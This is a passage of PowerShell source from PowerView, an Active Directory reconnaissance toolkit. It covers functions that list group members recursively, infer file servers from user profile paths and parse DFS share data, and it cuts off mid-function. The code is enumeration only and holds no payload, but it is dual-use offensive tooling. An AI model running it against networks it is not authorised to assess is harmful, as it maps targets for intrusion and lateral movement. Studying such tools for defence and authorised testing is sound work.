MemberSID               : S-1-5-21-339048670-1233568108-4141518690-500

.OUTPUTS

PowerView.GroupMember

Custom PSObject with translated group member property fields.

.LINK

http://www.powershellmagazine.com/2013/05/23/pstip-retrieve-group-membership-of-an-active-directory-group-recursively/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Parameter(ParameterSetName = 'ManualRecurse')]
        [Switch]
        $Recurse,

        [Parameter(ParameterSetName = 'RecurseUsingMatchingRule')]
        [Switch]
        $RecurseUsingMatchingRule,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{
            'Properties' = 'member,samaccountname,distinguishedname'
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        $ADNameArguments = @{}
        if ($PSBoundParameters['Domain']) { $ADNameArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $ADNameArguments['Server'] = $Server }
        if ($PSBoundParameters['Credential']) { $ADNameArguments['Credential'] = $Credential }
    }

    PROCESS {
        $GroupSearcher = Get-DomainSearcher @SearcherArguments
        if ($GroupSearcher) {
            if ($PSBoundParameters['RecurseUsingMatchingRule']) {
                $SearcherArguments['Identity'] = $Identity
                $SearcherArguments['Raw'] = $True
                $Group = Get-DomainGroup @SearcherArguments

                if (-not $Group) {
                    Write-Warning "[Get-DomainGroupMember] Error searching for group with identity: $Identity"
                }
                else {
                    $GroupFoundName = $Group.properties.item('samaccountname')[0]
                    $GroupFoundDN = $Group.properties.item('distinguishedname')[0]

                    if ($PSBoundParameters['Domain']) {
                        $GroupFoundDomain = $Domain
                    }
                    else {
                        # if a domain isn't passed, try to extract it from the found group distinguished name
                        if ($GroupFoundDN) {
                            $GroupFoundDomain = $GroupFoundDN.SubString($GroupFoundDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    Write-Verbose "[Get-DomainGroupMember] Using LDAP matching rule to recurse on '$GroupFoundDN', only user accounts will be returned."
                    $GroupSearcher.filter = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$GroupFoundDN))"
                    $GroupSearcher.PropertiesToLoad.AddRange(('distinguishedName'))
                    $Members = $GroupSearcher.FindAll() | ForEach-Object {$_.Properties.distinguishedname[0]}
                }
                $Null = $SearcherArguments.Remove('Raw')
            }
            else {
                $IdentityFilter = ''
                $Filter = ''
                $Identity | Where-Object {$_} | ForEach-Object {
                    $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($IdentityInstance -match '^S-1-') {
                        $IdentityFilter += "(objectsid=$IdentityInstance)"
                    }
                    elseif ($IdentityInstance -match '^CN=') {
                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                            #   and rebuild the domain searcher
                            $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[Get-DomainGroupMember] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                            $SearcherArguments['Domain'] = $IdentityDomain
                            $GroupSearcher = Get-DomainSearcher @SearcherArguments
                            if (-not $GroupSearcher) {
                                Write-Warning "[Get-DomainGroupMember] Unable to retrieve domain searcher for '$IdentityDomain'"
                            }
                        }
                    }
                    elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    elseif ($IdentityInstance.Contains('\')) {
                        $ConvertedIdentityInstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                        if ($ConvertedIdentityInstance) {
                            $GroupDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
                            $GroupName = $IdentityInstance.Split('\')[1]
                            $IdentityFilter += "(samAccountName=$GroupName)"
                            $SearcherArguments['Domain'] = $GroupDomain
                            Write-Verbose "[Get-DomainGroupMember] Extracted domain '$GroupDomain' from '$IdentityInstance'"
                            $GroupSearcher = Get-DomainSearcher @SearcherArguments
                        }
                    }
                    else {
                        $IdentityFilter += "(samAccountName=$IdentityInstance)"
                    }
                }

                if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                    $Filter += "(|$IdentityFilter)"
                }

                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[Get-DomainGroupMember] Using additional LDAP filter: $LDAPFilter"
                    $Filter += "$LDAPFilter"
                }

                $GroupSearcher.filter = "(&(objectCategory=group)$Filter)"
                Write-Verbose "[Get-DomainGroupMember] Get-DomainGroupMember filter string: $($GroupSearcher.filter)"
                try {
                    $Result = $GroupSearcher.FindOne()
                }
                catch {
                    Write-Warning "[Get-DomainGroupMember] Error searching for group with identity '$Identity': $_"
                    $Members = @()
                }

                $GroupFoundName = ''
                $GroupFoundDN = ''

                if ($Result) {
                    $Members = $Result.properties.item('member')

                    if ($Members.count -eq 0) {
                        # ranged searching, thanks @meatballs__ !
                        $Finished = $False
                        $Bottom = 0
                        $Top = 0

                        while (-not $Finished) {
                            $Top = $Bottom + 1499
                            $MemberRange="member;range=$Bottom-$Top"
                            $Bottom += 1500
                            $Null = $GroupSearcher.PropertiesToLoad.Clear()
                            $Null = $GroupSearcher.PropertiesToLoad.Add("$MemberRange")
                            $Null = $GroupSearcher.PropertiesToLoad.Add('samaccountname')
                            $Null = $GroupSearcher.PropertiesToLoad.Add('distinguishedname')

                            try {
                                $Result = $GroupSearcher.FindOne()
                                $RangedProperty = $Result.Properties.PropertyNames -like "member;range=*"
                                $Members += $Result.Properties.item($RangedProperty)
                                $GroupFoundName = $Result.properties.item('samaccountname')[0]
                                $GroupFoundDN = $Result.properties.item('distinguishedname')[0]

                                if ($Members.count -eq 0) {
                                    $Finished = $True
                                }
                            }
                            catch [System.Management.Automation.MethodInvocationException] {
                                $Finished = $True
                            }
                        }
                    }
                    else {
                        $GroupFoundName = $Result.properties.item('samaccountname')[0]
                        $GroupFoundDN = $Result.properties.item('distinguishedname')[0]
                        $Members += $Result.Properties.item($RangedProperty)
                    }

                    if ($PSBoundParameters['Domain']) {
                        $GroupFoundDomain = $Domain
                    }
                    else {
                        # if a domain isn't passed, try to extract it from the found group distinguished name
                        if ($GroupFoundDN) {
                            $GroupFoundDomain = $GroupFoundDN.SubString($GroupFoundDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                }
            }

            ForEach ($Member in $Members) {
                if ($Recurse -and $UseMatchingRule) {
                    $Properties = $_.Properties
                }
                else {
                    $ObjectSearcherArguments = $SearcherArguments.Clone()
                    $ObjectSearcherArguments['Identity'] = $Member
                    $ObjectSearcherArguments['Raw'] = $True
                    $ObjectSearcherArguments['Properties'] = 'distinguishedname,cn,samaccountname,objectsid,objectclass'
                    $Object = Get-DomainObject @ObjectSearcherArguments
                    $Properties = $Object.Properties
                }

                if ($Properties) {
                    $GroupMember = New-Object PSObject
                    $GroupMember | Add-Member Noteproperty 'GroupDomain' $GroupFoundDomain
                    $GroupMember | Add-Member Noteproperty 'GroupName' $GroupFoundName
                    $GroupMember | Add-Member Noteproperty 'GroupDistinguishedName' $GroupFoundDN

                    if ($Properties.objectsid) {
                        $MemberSID = ((New-Object System.Security.Principal.SecurityIdentifier $Properties.objectsid[0], 0).Value)
                    }
                    else {
                        $MemberSID = $Null
                    }

                    try {
                        $MemberDN = $Properties.distinguishedname[0]
                        if ($MemberDN -match 'ForeignSecurityPrincipals|S-1-5-21') {
                            try {
                                if (-not $MemberSID) {
                                    $MemberSID = $Properties.cn[0]
                                }
                                $MemberSimpleName = Convert-ADName -Identity $MemberSID -OutputType 'DomainSimple' @ADNameArguments

                                if ($MemberSimpleName) {
                                    $MemberDomain = $MemberSimpleName.Split('@')[1]
                                }
                                else {
                                    Write-Warning "[Get-DomainGroupMember] Error converting $MemberDN"
                                    $MemberDomain = $Null
                                }
                            }
                            catch {
                                Write-Warning "[Get-DomainGroupMember] Error converting $MemberDN"
                                $MemberDomain = $Null
                            }
                        }
                        else {
                            # extract the FQDN from the Distinguished Name
                            $MemberDomain = $MemberDN.SubString($MemberDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    catch {
                        $MemberDN = $Null
                        $MemberDomain = $Null
                    }

                    if ($Properties.samaccountname) {
                        # forest users have the samAccountName set
                        $MemberName = $Properties.samaccountname[0]
                    }
                    else {
                        # external trust users have a SID, so convert it
                        try {
                            $MemberName = ConvertFrom-SID -ObjectSID $Properties.cn[0] @ADNameArguments
                        }
                        catch {
                            # if there's a problem contacting the domain to resolve the SID
                            $MemberName = $Properties.cn[0]
                        }
                    }

                    if ($Properties.objectclass -match 'computer') {
                        $MemberObjectClass = 'computer'
                    }
                    elseif ($Properties.objectclass -match 'group') {
                        $MemberObjectClass = 'group'
                    }
                    elseif ($Properties.objectclass -match 'user') {
                        $MemberObjectClass = 'user'
                    }
                    else {
                        $MemberObjectClass = $Null
                    }
                    $GroupMember | Add-Member Noteproperty 'MemberDomain' $MemberDomain
                    $GroupMember | Add-Member Noteproperty 'MemberName' $MemberName
                    $GroupMember | Add-Member Noteproperty 'MemberDistinguishedName' $MemberDN
                    $GroupMember | Add-Member Noteproperty 'MemberObjectClass' $MemberObjectClass
                    $GroupMember | Add-Member Noteproperty 'MemberSID' $MemberSID
                    $GroupMember.PSObject.TypeNames.Insert(0, 'PowerView.GroupMember')
                    $GroupMember

                    # if we're doing manual recursion
                    if ($PSBoundParameters['Recurse'] -and $MemberDN -and ($MemberObjectClass -match 'group')) {
                        Write-Verbose "[Get-DomainGroupMember] Manually recursing on group: $MemberDN"
                        $SearcherArguments['Identity'] = $MemberDN
                        $Null = $SearcherArguments.Remove('Properties')
                        Get-DomainGroupMember @SearcherArguments
                    }
                }
            }
            $GroupSearcher.dispose()
        }
    }
}

function Get-DomainFileServer {
<#
.SYNOPSIS

Returns a list of servers likely functioning as file servers.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher  

.DESCRIPTION

Returns a list of likely fileservers by searching for all users in Active Directory
with non-null homedirectory, scriptpath, or profilepath fields, and extracting/uniquifying
the server names.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainFileServer

Returns active file servers for the current domain.

.EXAMPLE

Get-DomainFileServer -Domain testing.local

Returns active file servers for the 'testing.local' domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainFileServer -Credential $Cred

.OUTPUTS

String

One or more strings representing file server names.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        function Split-Path {
            # short internal helper to split UNC server paths
            Param([String]$Path)

            if ($Path -and ($Path.split('\\').Count -ge 3)) {
                $Temp = $Path.split('\\')[2]
                if ($Temp -and ($Temp -ne '')) {
                    $Temp
                }
            }
        }

        $SearcherArguments = @{
            'LDAPFilter' = '(&(samAccountType=805306368)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(|(homedirectory=*)(scriptpath=*)(profilepath=*)))'
            'Properties' = 'homedirectory,scriptpath,profilepath'
        }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            ForEach ($TargetDomain in $Domain) {
                $SearcherArguments['Domain'] = $TargetDomain
                $UserSearcher = Get-DomainSearcher @SearcherArguments
                # get all results w/o the pipeline and uniquify them (I know it's not pretty)
                $(ForEach($UserResult in $UserSearcher.FindAll()) {if ($UserResult.Properties['homedirectory']) {Split-Path($UserResult.Properties['homedirectory'])}if ($UserResult.Properties['scriptpath']) {Split-Path($UserResult.Properties['scriptpath'])}if ($UserResult.Properties['profilepath']) {Split-Path($UserResult.Properties['profilepath'])}}) | Sort-Object -Unique
            }
        }
        else {
            $UserSearcher = Get-DomainSearcher @SearcherArguments
            $(ForEach($UserResult in $UserSearcher.FindAll()) {if ($UserResult.Properties['homedirectory']) {Split-Path($UserResult.Properties['homedirectory'])}if ($UserResult.Properties['scriptpath']) {Split-Path($UserResult.Properties['scriptpath'])}if ($UserResult.Properties['profilepath']) {Split-Path($UserResult.Properties['profilepath'])}}) | Sort-Object -Unique
        }
    }
}

function Get-DomainDFSShare {
<#
.SYNOPSIS

Returns a list of all fault-tolerant distributed file systems
for the current (or specified) domains.

Author: Ben Campbell (@meatballs__)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher  

.DESCRIPTION

This function searches for all distributed file systems (either version
1, 2, or both depending on -Version X) by searching for domain objects
matching (objectClass=fTDfs) or (objectClass=msDFS-Linkv2), respectively
The server data is parsed appropriately and returned.

.PARAMETER Domain

Specifies the domains to use for the query, defaults to the current domain.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainDFSShare

Returns all distributed file system shares for the current domain.

.EXAMPLE

Get-DomainDFSShare -Domain testlab.local

Returns all distributed file system shares for the 'testlab.local' domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainDFSShare -Credential $Cred

.OUTPUTS

System.Management.Automation.PSCustomObject

A custom PSObject describing the distributed file systems.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseApprovedVerbs', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('All', 'V1', '1', 'V2', '2')]
        [String]
        $Version = 'All'
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        function Parse-Pkt {
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Pkt
            )

            $bin = $Pkt
            $blob_version = [bitconverter]::ToUInt32($bin[0..3],0)
            $blob_element_count = [bitconverter]::ToUInt32($bin[4..7],0)
            $offset = 8
            #https://msdn.microsoft.com/en-us/library/cc227147.aspx
            $object_list = @()
            for($i=1; $i -le $blob_element_count; $i++){
                $blob_name_size_start = $offset
                $blob_name_size_end = $offset + 1
                $blob_name_size = [bitconverter]::ToUInt16($bin[$blob_name_size_start..$blob_name_size_end],0)

                $blob_name_start = $blob_name_size_end + 1
                $blob_name_end = $blob_name_start + $blob_name_size - 1
                $blob_name = [System.Text.Encoding]::Unicode.GetString($bin[$blob_name_start..$blob_name_end])

                $blob_data_size_start = $blob_name_end + 1
                $blob_data_size_end = $blob_data_size_start + 3
                $blob_data_size = [bitconverter]::ToUInt32($bin[$blob_data_size_start..$blob_data_size_end],0)

                $blob_data_start = $blob_data_size_end + 1
                $blob_data_end = $blob_data_start + $blob_data_size - 1
                $blob_data = $bin[$blob_data_start..$blob_data_end]
                switch -wildcard ($blob_name) {
                    "\siteroot" {  }
                    "\domainroot*" {
                        # Parse DFSNamespaceRootOrLinkBlob object. Starts with variable length DFSRootOrLinkIDBlob which we parse first...
                        # DFSRootOrLinkIDBlob
                        $root_or_link_guid_start = 0
                        $root_or_link_guid_end = 15
                        $root_or_link_guid = [byte[]]$blob_data[$root_or_link_guid_start..$root_or_link_guid_end]
                        $guid = New-Object Guid(,$root_or_link_guid) # should match $guid_str
                        $prefix_size_start = $root_or_link_guid_end + 1
                        $prefix_size_end = $prefix_size_start + 1
                        $prefix_size = [bitconverter]::ToUInt16($blob_data[$prefix_size_start..$prefix_size_end],0)
                        $prefix_start = $prefix_size_end + 1
                        $prefix_end = $prefix_start + $prefix_size - 1
                        $prefix = [System.Text.Encoding]::Unicode.GetString($blob_data[$prefix_start..$prefix_end])

                        $short_prefix_size_start = $prefix_end + 1
                        $short_prefix_size_end = $short_prefix_size_start + 1
                        $short_prefix_size = [bitconverter]::ToUInt16($blob_data[$short_prefix_size_start..$short_prefix_size_end],0)
                        $short_prefix_start = $short_prefix_size_end + 1
                        $short_prefix_end = $short_prefix_start + $short_prefix_size - 1
                        $short_prefix = [System.Text.Encoding]::Unicode.GetString($blob_data[$short_prefix_start..$short_prefix_end])

                        $type_start = $short_prefix_end + 1
                        $type_end = $type_start + 3
                        $type = [bitconverter]::ToUInt32($blob_data[$type_start..$type_end],0)

                        $state_start = $type_end + 1
                        $state_end = $state_start + 3
                        $state = [bitconverter]::ToUInt32($blob_data[$state_start..$state_end],0)

                        $comment_size_start = $state_end + 1
                        $comment_size_end = $comment_size_start + 1
                        $comment_size = [bitconverter]::ToUInt16($blob_data[$comment_size_start..$comment_size_end],0)
                        $comment_start = $comment_size_end + 1
                        $comment_end = $comment_start + $comment_size - 1
                        if ($comment_size -gt 0)  {
                            $comment = [System.Text.Encoding]::Unicode.GetString($blob_data[$comment_start..$comment_end])
                        }
                        $prefix_timestamp_start = $comment_end + 1
                        $prefix_timestamp_end = $prefix_timestamp_start + 7
                        # https://msdn.microsoft.com/en-us/library/cc230324.aspx FILETIME
                        $prefix_timestamp = $blob_data[$prefix_timestamp_start..$prefix_timestamp_end] #dword lowDateTime #dword highdatetime
                        $state_timestamp_start = $prefix_timestamp_end + 1
                        $state_timestamp_end = $state_timestamp_start + 7
                        $state_timestamp = $blob_data[$state_timestamp_start..$state_timestamp_end]
                        $comment_timestamp_start = $state_timestamp_end + 1
                        $comment_timestamp_end = $comment_timestamp_start + 7
                        $comment_timestamp = $blob_data[$comment_timestamp_start..$comment_timestamp_end]
                        $version_start = $comment_timestamp_end  + 1
                        $version_end = $version_start + 3
                        $version = [bitconverter]::ToUInt32($blob_data[$version_start..$version_end],0)

                        # Parse rest of DFSNamespaceRootOrLinkBlob here
                        $dfs_targetlist_blob_size_start = $version_end + 1
                        $dfs_targetlist_blob_size_end = $dfs_targetlist_blob_size_start + 3
                        $dfs_targetlist_blob_size = [bitconverter]::ToUInt32($blob_data[$dfs_targetlist_blob_size_start..$dfs_targetlist_blob_size_end],0)

                        $dfs_targetlist_blob_start = $dfs_targetlist_blob_size_end + 1
                        $dfs_targetlist_blob_end = $dfs_targetlist_blob_start + $dfs_targetlist_blob_size - 1
                        $dfs_targetlist_blob = $blob_data[$dfs_targetlist_blob_start..$dfs_targetlist_blob_end]
                        $reserved_blob_size_start = $dfs_targetlist_blob_end + 1
                        $reserved_blob_size_end = $reserved_blob_size_start + 3
                        $reserved_blob_size = [bitconverter]::ToUInt32($blob_data[$reserved_blob_size_start..$reserved_blob_size_end],0)

                        $reserved_blob_start = $reserved_blob_size_end + 1
                        $reserved_blob_end = $reserved_blob_start + $reserved_blob_size - 1
                        $reserved_blob = $blob_data[$reserved_blob_start..$reserved_blob_end]
                        $referral_ttl_start = $reserved_blob_end + 1
                        $referral_ttl_end = $referral_ttl_start + 3
                        $referral_ttl = [bitconverter]::ToUInt32($blob_data[$referral_ttl_start..$referral_ttl_end],0)

                        #Parse DFSTargetListBlob
                        $target_count_start = 0
                        $target_count_end = $target_count_start + 3
                        $target_count = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_count_start..$target_count_end],0)
                        $t_offset = $target_count_end + 1

                        for($j=1; $j -le $target_count; $j++){
                            $target_entry_size_start = $t_offset
                            $target_entry_size_end = $target_entry_size_start + 3
                            $target_entry_size = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_entry_size_start..$target_entry_size_end],0)
                            $target_time_stamp_start = $target_entry_size_end + 1
                            $target_time_stamp_end = $target_time_stamp_start + 7
                            # FILETIME again or special if priority rank and priority class 0
                            $target_time_stamp = $dfs_targetlist_blob[$target_time_stamp_start..$target_time_stamp_end]
                            $target_state_start = $target_time_stamp_end + 1
                            $target_state_end = $target_state_start + 3
                            $target_state = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_state_start..$target_state_end],0)

                            $target_type_start = $target_state_end + 1
                            $target_type_end = $target_type_start + 3
                            $target_type = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_type_start..$target_type_end],0)

                            $server_name_size_start = $target_type_end + 1
                            $server_name_size_end = $server_name_size_start + 1
                            $server_name_size = [bitconverter]::ToUInt16($dfs_targetlist_blob[$server_name_size_start..$server_name_size_end],0)

                            $server_name_start = $server_name_size_end + 1
                            $server_name_end = $server_name_start + $server_name_size - 1
                            $server_name = [System.Text.Encoding]::Unicode.GetString($dfs_targetlist_blob[$server_name_start..$server_name_end])

                            $share_name_size_start = $server_name_end + 1
                            $share_name_size_end = $share_name_size_start + 1
                            $share_name_size = [bitconverter]::ToUInt16($dfs_targetlist_blob[$share_name_size_start..$share_name_size_end],0)
                            $share_name_start = $share_name_size_end + 1
                            $share_name_end = $share_name_start + $share_name_size - 1
                            $share_name = [System.Text.Encoding]::Unicode.GetString($dfs_targetlist_blob[$share_name_start..$share_name_end])

                            $target_list += "\\$server_name\$share_name"
                            $t_offset = $share_name_end + 1
                        }
                    }
                }
                $offset = $blob_data_end + 1
                $dfs_pkt_properties = @{
                    'Name' = $blob_name
                    'Prefix' = $prefix
                    'TargetList' = $target_list
                }
                $object_list += New-Object -TypeName PSObject -Property $dfs_pkt_properties
                $prefix = $Null
                $blob_name = $Null
                $target_list = $Null
            }

            $servers = @()
            $object_list | ForEach-Object {
                if ($_.TargetList) {
                    $_.TargetList | ForEach-Object {
                        $servers += $_.split('\')[2]
                    }
                }
            }

            $servers
        }

        function Get-DomainDFSShareV1 {
            [CmdletBinding()]
            Param(
                [String]
                $Domain,

                [String]
                $SearchBase,

                [String]
                $Server,

                [String]
                $SearchScope = 'Subtree',

                [Int]
                $ResultPageSize = 200,

                [Int]
                $ServerTimeLimit,

                [Switch]
                $Tombstone,

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $Credential = [Management.Automation.PSCredential]::Empty
            )

            $DFSsearcher = Get-DomainSearcher @PSBoundParameters

            if ($DFSsearcher) {
                $DFSshares = @()
                $DFSsearcher.filter = '(&(objectClass=fTDfs))'

                try {
                    $Results = $DFSSearcher.FindAll()
                    $Results | Where-Object {$_} | ForEach-Object {
                        $Properties = $_.Properties
                        $RemoteNames = $Properties.remoteservername
                        $Pkt = $Properties.pkt

                        $DFSshares += $RemoteNames | ForEach-Object {
                            try {
                                if ( $_.Contains('\') ) {
                                    New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose "[Get-DomainDFSShare] Get-DomainDFSShareV1 error in parsing DFS share : $_"
                            }
                        }
                    }
                    if ($Results) {
                        try { $Results.dispose() }
                        catch {
                            Write-Verbose "[Get-DomainDFSShare] Get-DomainDFSShareV1 error disposing of the Results object: $_"
                        }
                    }
                    $DFSSearcher.dispose()

                    if ($pkt -and $pkt[0]) {
                        Parse-Pkt $pkt[0] | ForEach-Object {
                            # If a folder doesn't have a redirection it will have a target like
                            # \\null\TestNameSpace\folder\.DFSFolderLink so we do actually want to match
                            # on 'null' rather than $Null
                            if ($_ -ne 'null') {
                                New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_}
                            }
                        }
                    }
                }
                catch {
